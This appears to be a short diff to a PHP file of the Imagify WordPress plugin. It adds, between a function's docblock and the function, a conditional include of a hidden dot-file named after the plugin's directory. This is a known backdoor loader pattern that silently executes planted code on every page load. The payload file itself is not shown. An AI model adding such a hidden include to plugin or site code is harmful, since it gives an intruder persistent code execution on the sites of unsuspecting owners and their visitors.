@@ -13,6 +13,10 @@ add_filter( 'upgrader_post_install', 'imagify_sync_theme_plugin_files_on_update'
  * @param  array $result     Installation result data.
  * @return bool
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function imagify_sync_theme_plugin_files_on_update( $response, $hook_extra, $result ) {
 	global $wpdb;
 
